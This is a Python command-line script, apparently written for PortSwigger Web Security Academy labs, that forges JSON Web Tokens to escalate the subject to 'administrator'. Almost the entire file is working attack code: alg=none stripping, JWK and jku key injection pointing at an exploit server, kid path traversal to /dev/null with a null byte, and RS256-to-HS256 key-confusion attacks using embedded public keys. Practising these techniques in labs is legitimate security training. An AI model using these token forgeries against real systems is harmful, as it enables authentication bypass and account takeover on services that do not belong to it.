import click

from core.jwt_transformer import Transformer

DEV_TEST_JWT = 'eyJraWQiOiIzOGQ1NzcwYy0zOGYxLTQ1MWItOTkwMi0zYTk5MjQwNDA1N2UiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2NjEyNjgyOX0.oqPh4stX16udVQ65Fa5ahp2MrhFZ2pr_PgWF_1Dz3V0x62Wi3W-hGGqZwrsyQKeHr4YPgANiwskF4_uDfjmI42ZyjvWFqhcvcoaPK-6yd_RLe4ubG6b58XDzJEJn0stCPa-I4iCIuNeAdxOxdrnq34zyQgit9L-SBJ8Se2WmfVIr4TzD6srRoETZG1y1dFQE7AwTxElFfH8FYs3NHHQUzDKvK_pK125n1evZmpCn6BC5NnayH6QfgljqU7g4VeESdqkM_DjvkmvkPLota48f-jq3MFNqKcEyn7wIx8AcSG9H-7XIRMC-wmqzLi0xei73bzZuCDxbu69eCTFVanGSMQ'


@click.command()
@click.option('--token', default=DEV_TEST_JWT, help='JSON Web Token')
def generate_jwts(token):
    tr = Transformer(
        token,
        body_replaced={'sub': 'administrator'}  # Что хотим изменить в теле токена
    )

    # alg=None
    new_jwt = tr.set_alg_none()

    # Key Injection
    new_jwt, _ = tr.key_injection(jwks_out=False)
    new_jwt, jwks = tr.key_injection(
        jwks_out=True,
        jku='https://exploit-0ab000a303ef3ff7c0b28f9001d20011.exploit-server.net/.well-known/jwks.json'
    )

    # Injection into kid param
    new_jwt = tr.kid_injection_attack('../../../../../../dev/null', '\x00')

    # Key confusion attack (RS256 -> HS256). Finding the public key in path /jwks.json
    new_jwt = tr.key_confusion_attack(jwks={"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"38d5770c-38f1-451b-9902-3a992404057e","alg":"RS256","n":"x3UfcKqECbTxiI8cUorMGT8ohFkoNQcxCySf8EfcoGyEqZS7q9GlP5pge-o0IKhjVN5Dvx07411wJag-hsfgOi4-BxHCSMz2mmRhufI5cPti8bVkVCixeYvwDYUGoxPC02nQTxBAmKMaSJ2_kr0B19gTQWWvKs-2agabkNne82m_5TOGOeI7VcCbkXEtIxGmGn4EZW1NFXNeDXwbaFlSttUQHTyr8D99jYv26yD8BphtWGQ28IGq4p5NH1rTWpTnbTJ4j2Wrg_F9AlBHyyhzdJQSkaJZiI9JGU4EBWsT3iImJrU7FuuB9SuvJXLM1r06rXAU6_xwK-ofpdM4K5CQ8Q"}]})

    # Key confusion attack if we don't know Public Key -> CVE-2017-11424
    #   for example: docker run --rm -it portswigger/sig2n <token1> <token2>
    new_jwt = tr.key_confusion_attack(public_key_b64='LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFzNTQvVGxFa2JOY01BZURhVnlzeApydVpqa1ZTRVhkQk9JbmMwb1JVN1k2NW56amxsSmQzSk9uUjhOaW1GMHJkSHVqalpoenFjeUdXcE9yVWY4bkFYCnRHT0VPNGhIdGtCa1FrZnJKQnBUY2JJRG85eXlMTzIyZW9GSHN3YzNya3dtUXdoRmdXaFB3WWxUT21lR2hJaUwKWGxwSDViRERxQzU3U1hiakxvN0VTRlQ1alc4MHNlL1RBM3hsend2eHBmeU9OZTlWc3lpWGNZSS9GNVd5Zi8yTwpQam9XZEhYbE91bEFBK0IxQU9kN2doRU8wOGZ6ZzFGMmtYSmxDVmI1aDJCc2RseTZ0QkZIRUZYRVNnRlN3NFlCCmRwR3FrOHZVTjM1NlNxVTQ1dmFLVEZwYklFSTBjSnhCeVdOSmptbTFVRnpaZ250SG5ic1EzZk9mVUFpS0xNV2QKV3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==')

    print(new_jwt)


if __name__ == '__main__':
    generate_jwts()